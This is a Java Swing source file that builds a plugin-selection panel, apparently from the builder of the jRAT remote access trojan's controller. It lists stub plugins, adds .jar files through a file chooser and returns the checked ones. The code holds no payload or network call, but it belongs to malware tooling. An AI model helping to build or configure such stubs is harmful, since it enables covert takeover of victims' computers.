package io.jrat.controller.ui.panels;

import iconlib.IconUtils;
import io.jrat.controller.Globals;
import io.jrat.controller.addons.PluginList;
import io.jrat.controller.addons.StubPlugin;
import io.jrat.controller.ui.components.JCheckBoxList;
import io.jrat.controller.ui.components.JCheckBoxList.Entry;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFileChooser;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.LayoutStyle.ComponentPlacement;


@SuppressWarnings("serial")
public class PanelBuildPlugins extends JPanel {

	private JCheckBoxList table;
	private PluginList list;
	private JCheckBox chckbxDoNotLoad;
	private JCheckBoxList.CheckBoxListModel model;

	public PluginList getList() {
		PluginList plugins = new PluginList();

		Entry[] entries = table.getValues();

		for (StubPlugin stubPlugin : list.plugins) {
			for (Entry entry : entries) {
				if (stubPlugin.name.endsWith(entry.getValue().toString()) && entry.isChecked()) {
					plugins.plugins.add(stubPlugin);
				}
			}
		}

		return plugins.plugins.size() == 0 ? null : plugins;
	}

	public PanelBuildPlugins() {
		list = new PluginList();
		JScrollPane scrollPane = new JScrollPane();

		JButton btnAddServerPlugin = new JButton("Add from file");
		btnAddServerPlugin.addActionListener(new ActionListener() {
			@SuppressWarnings("unchecked")
			public void actionPerformed(ActionEvent arg0) {
				JFileChooser ch = new JFileChooser();
				ch.showOpenDialog(null);
				File file = ch.getSelectedFile();
				if (file != null) {
					if (file.isFile() && file.exists() && file.getName().endsWith(".jar")) {
						StubPlugin p = new StubPlugin(file.getAbsolutePath(), !chckbxDoNotLoad.isSelected());
						list.plugins.add(p);

						model.items.addElement(model.createEntry(p.name));
						table.repaint();
					}
				}
			}
		});
		btnAddServerPlugin.setIcon(IconUtils.getIcon("plugin-add"));

		chckbxDoNotLoad = new JCheckBox("Do not load class");
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
						.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 428, Short.MAX_VALUE)
						.addGroup(groupLayout.createSequentialGroup()
							.addComponent(btnAddServerPlugin)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(chckbxDoNotLoad)))
					.addGap(12))
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 234, Short.MAX_VALUE)
					.addGap(15)
					.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
						.addComponent(btnAddServerPlugin)
						.addComponent(chckbxDoNotLoad))
					.addContainerGap())
		);

		File[] files = Globals.getPluginStubDirectory().listFiles();

		Object[] obj = new Object[] {};

		if (files != null) {
			obj = new Object[files.length];

			for (int i = 0; i < files.length; i++) {
				obj[i] = files[i].getName();
				StubPlugin p = new StubPlugin(files[i].getAbsolutePath(), false);
				list.plugins.add(p);
			}
		}

		table = new JCheckBoxList(obj);
		model = ((JCheckBoxList.CheckBoxListModel) table.getModel());
		table.setRowHeight(25);
		table.getTableHeader().setReorderingAllowed(false);
		scrollPane.setViewportView(table);
		setLayout(groupLayout);

	}
}
